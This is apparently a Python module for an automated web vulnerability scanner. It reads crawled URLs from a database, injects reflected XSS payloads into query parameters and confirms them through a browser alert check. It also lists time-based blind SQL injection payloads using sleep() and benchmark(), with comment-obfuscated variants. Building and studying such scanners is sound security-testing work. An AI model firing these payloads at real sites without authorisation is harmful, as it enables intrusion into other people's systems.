from urllib.parse import parse_qs, unquote, urlparse, urljoin, urlencode
from .Crawler import Crawler, DATABASE, sessions, var
from bs4 import BeautifulSoup
from threading import Thread, ThreadError
from base64 import b64decode
import tldextract


class Fuzzing:
    def __init__(self, URL, Page = False, db = {}, **REQUEST_INFO) -> None:
        self.tags = var.tags
        self.Page = Page
        self.URLists = set()
        self.FirstURL = urlparse(URL)
        self.LatestURL = self.URL = URL
        REQUEST_INFO.setdefault('timeout', var.TIMEOUT)
        REQUEST_INFO.setdefault('headers', var.USER_AGENT)
        
        self.conn = DATABASE(host = db['HOST'], port = db['PORT'], user = db['USER'], passwd = db['PASSWORD'], db = db['DB'])

        self.table = tldextract.extract(URL).domain

        self.REQUEST_INFO = REQUEST_INFO
        self.URLJOIN = (lambda TMPURL: urljoin(self.URL, TMPURL) if TMPURL else None)

        self.DB_URL()
        

    def DB_URL(self) -> list:
        for i in self.conn.URL_SELECT(TABLE_NAME=self.table):
            self.xss(i['last_url'])

    def xss(self, url, **REQ):
        payloads = [
            '<script>alert(1);</script>',
            '"><script>alert(1);</script>',
            '\'><script>alert(1);</script>',
            '"><script>alert(1);</script><"',
            '\'><script>alert(1);</script><\'',
        ]
        
        assert url

        REQUEST = sessions(self.LatestURL, **REQ)
        REQUEST.webdriver()
        explurl = urlparse(url)

        if explurl.query:
            qs = parse_qs(explurl.query, keep_blank_values=True)
            for key in qs.keys():
                for pay in payloads:
                    qs[key] = pay
                    rq = REQUEST.sess_set_get(explurl._replace(query=urlencode(qs, doseq=True)).geturl())
                    if pay in rq['body']:
                        
                        rs = REQUEST.DriveAlertCheck(REQUEST.url)
                        if rs['alert']:
                            print(f"XSS 취약점이 발생되는 URL 감지! : {REQUEST.url}")
                            break

        REQUEST.drive.quit()

    def openredirect(self):
        payloads = [
            ''
        ]

        return payloads

    def simple_sqli(self):
        payloads = [
            '\'',
            '"',
            '0',
            '0\'',
            '0"',
        ]

        return payloads

    def sleep_sqli(self):
        payloads = [
            '\' or sleep(10) -- \'',
            '" or sleep(10) -- "',
            '0 or sleep(10) -- ',
            '\' or sleep(10) #\'',
            '" or sleep(10) #"',
            '0 or sleep(10) #',
            '\' or benchmark(7380000000*10,md5(1)) -- \'',
            '" or benchmark(7380000000*10,md5(1)) -- "',
            '0 or benchmark(7380000000*10,md5(1)) -- ',
            '\' or benchmark(7380000000*10,md5(1)) #\'',
            '" or benchmark(7380000000*10,md5(1)) #"',
            '0 or benchmark(7380000000*10,md5(1)) #',
            '\'/**/or/**/sleep(10)/**/--/**/\'',
            '"/**/or/**/sleep(10)/**/--/**/"',
            '0/**/or/**/sleep(10)/**/--/**/',
            '\'/**/or/**/sleep(10)/**/#\'',
            '"/**/or/**/sleep(10)/**/#"',
            '0/**/or/**/sleep(10)/**/#',
            '\'/**/or/**/benchmark(7380000000*10,md5(1))/**/--/**/\'',
            '"/**/or/**/benchmark(7380000000*10,md5(1))/**/--/**/"',
            '0/**/or/**/benchmark(7380000000*10,md5(1))/**/--/**/',
            '\'/**/or/**/benchmark(7380000000*10,md5(1))/**/#\'',
            '"/**/or/**/benchmark(7380000000*10,md5(1))/**/#"',
            '0/**/or/**/benchmark(7380000000*10,md5(1))/**/#',
        ]

        return payloads

# Fuzzing('http://localhost/', Page=True, db={
#     'HOST':'localhost',
#     'PORT':3306,
#     'USER':'root',
#     'PASSWORD':'autoset',
#     'DB':'fuzzing'
# })